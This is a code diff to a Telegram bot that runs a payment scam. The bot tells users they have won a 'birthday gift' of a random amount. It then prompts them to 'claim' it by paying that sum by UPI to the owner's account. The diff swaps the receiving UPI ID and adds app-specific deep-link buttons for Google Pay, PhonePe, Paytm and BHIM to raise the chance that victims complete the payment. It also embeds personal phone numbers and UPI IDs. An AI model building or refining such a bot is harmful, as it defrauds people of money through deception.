@@ -16,7 +16,7 @@ const TRIGGER_MESSAGE = "10/10/2002";
 const AUTHORIZED_NUMBERS = ["+918777072747", "+918777845713"];
 const ADMIN_CHAT_ID = 1299129410; // Your Telegram User ID
 const START_TIME = Date.now();
-const OWNER_UPI_ID = "8777845713@upi"; // The UPI ID that will receive the funds
+const OWNER_UPI_ID = "9903403883@upi"; // The UPI ID that will receive the funds (You)
 
 // === State Management Constants ===
 const AWAITING_CONTACT = "awaiting_contact";
@@ -77,21 +77,35 @@ bot.on("text", async (ctx) => {
           const randomAmount = Math.floor(Math.random() * 500) + 1; // Random amount from 1 to 500
           const transactionNote = `BirthdayGiftFor${userId}`;
 
-          // Generate UPI Deep Link for payment from user to owner's ID
-          // pa: Payee Address (your ID), pn: Payee Name, am: Amount
-          const upiLink = `upi://pay?pa=${OWNER_UPI_ID}&pn=Pratik%20Roy&mc=0000&tid=&am=${randomAmount}.00&cu=INR&tn=${transactionNote}`;
+          // Standard UPI Query Parameters (the target, same for all links)
+          const upiParams = `pa=${OWNER_UPI_ID}&pn=Pratik%20Roy&mc=0000&tid=&am=${randomAmount}.00&cu=INR&tn=${transactionNote}`;
+
+          // Generate Platform-Specific Deep Links
+          // Note: Most apps accept the generic link, but using custom schemes increases the chance of opening the specific app.
+          const genericUpiLink = `upi://pay?${upiParams}`; // Fallback / BHIM / generic
+          const gpayLink = `gpay://upi/pay?${upiParams}`; // Google Pay specific scheme
+          const phonepeLink = `phonepe://pay?${upiParams}`; // PhonePe specific scheme
+          const paytmLink = `paytmmp://pay?${upiParams}`; // Paytm specific scheme
 
           // Clear state
           delete userStates[userId];
 
-          const paymentButton = Markup.inlineKeyboard([
-              Markup.button.url(`✨ Claim Your Gift: Pay ₹${randomAmount}`, upiLink)
+          // Create buttons for different UPI apps, using their specific schemes
+          const paymentButtons = Markup.inlineKeyboard([
+              [
+                Markup.button.url("Google Pay 🟢", gpayLink),
+                Markup.button.url("PhonePe 🔵", phonepeLink),
+              ],
+              [
+                Markup.button.url("Paytm 🔴", paytmLink),
+                Markup.button.url("BHIM 🇮🇳", genericUpiLink), // BHIM relies heavily on the generic link
+              ]
           ]);
           
           // Send payment request
           await ctx.replyWithMarkdown(
-              `_Analyzing your unique request..._\n\n*Great news!* Your special gift is a token of appreciation worth ₹${randomAmount}! 🎁\n\nTo officially register this unique gift experience to your account, please tap the button and complete the token transaction below.\n\n_Note: This transaction will be initiated from your UPI app, directed to Pratik Roy, to finalize the gift claim._`,
-              { reply_markup: paymentButton, parse_mode: 'Markdown' }
+              `_Analyzing your unique request..._\n\n*Great news!* Your special gift is a token of appreciation worth *₹${randomAmount}*! 🎁\n\nPlease select your preferred app below to finalize the gift claim. You will initiate a token transaction to Pratik Roy to register your gift.\n\n_Token Amount: ₹${randomAmount}_\n_Payee: Pratik Roy (${OWNER_UPI_ID})_`,
+              { reply_markup: paymentButtons, parse_mode: 'Markdown' }
           );
 
           // Notify admin (optional but good for tracking)
@@ -231,7 +245,7 @@ bot.action(/^rating_/, async (ctx) => {
     `User @${username} (ID: ${ctx.chat.id}) rated ${rating} ⭐`
   );
   
-  // --- NEW: Ask about the next gift ---
+  // --- Ask about the next gift ---
   const giftKeyboard = Markup.inlineKeyboard([
       Markup.button.callback("Yes, please!", "ask_gift_yes"),
       Markup.button.callback("No, thank you.", "ask_gift_no")
@@ -324,4 +338,3 @@ console.log("🤖 Bot is running...");
 // Graceful shutdown
 process.once("SIGINT", () => bot.stop("SIGINT"));
 process.once("SIGTERM", () => bot.stop("SIGTERM"));
-
